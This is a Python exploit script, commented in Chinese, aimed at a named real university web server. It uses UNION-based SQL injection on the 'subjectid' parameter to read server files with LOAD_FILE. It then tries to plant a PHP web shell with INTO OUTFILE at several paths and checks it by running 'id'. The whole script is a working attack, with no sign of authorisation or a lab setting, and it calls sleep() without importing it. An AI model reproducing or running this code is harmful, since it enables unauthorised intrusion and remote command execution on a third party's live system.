#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/enmeeting/getmobilesubject.php"

# 构造40个字段的UNION SELECT
nulls = ",".join(["NULL"] * 39)

print("[*] 测试UNION注入读取文件...")

# 读取x.php
payloads = [
    f"-1 UNION SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),{nulls}",
    f"-1 UNION SELECT HEX(LOAD_FILE('/var/www/html/banpot/scmeeting/x.php')),{nulls}",
    f"-1 UNION SELECT CONCAT('<?php ',LOAD_FILE('/var/www/html/banpot/scmeeting/x.php')),{nulls}",
]

for payload in payloads:
    resp = requests.get(url, params={"subjectid": payload}, verify=False, timeout=10)
    if "<?php" in resp.text:
        print(f"[+] 读取x.php成功!")
        print("="*70)
        print(resp.text)
        print("="*70)
        exit(0)
    elif len(resp.text) > 100:
        print(f"[*] 响应: {resp.text[:300]}")

# 尝试写入shell
print("\n[*] 尝试写入shell...")
write_payload = f"-1 UNION SELECT '<?php system($_GET[c]); ?>',{nulls} INTO OUTFILE '/var/www/html/enmeeting/shell.php'--"
resp = requests.get(url, params={"subjectid": write_payload}, verify=False, timeout=10)

sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 尝试其他路径
write_paths = [
    "/var/www/html/enmeeting/shell.php",
    "/var/www/html/shell.php",
    "/var/www/enmeeting/shell.php",
]

for write_path in write_paths:
    write_payload = f"-1 UNION SELECT '<?php system($_GET[c]); ?>',{nulls} INTO OUTFILE '{write_path}'--"
    resp = requests.get(url, params={"subjectid": write_payload}, verify=False, timeout=10)
    http_path = write_path.replace("/var/www/html", "")
    test_shell = requests.get(f"https://olympic.su.ac.th{http_path}?c=id", verify=False, timeout=5)
    if "uid=" in test_shell.text:
        print(f"[+] Shell获取成功: https://olympic.su.ac.th{http_path}?c=id")
        exit(0)

print("[-] SQL注入利用失败")
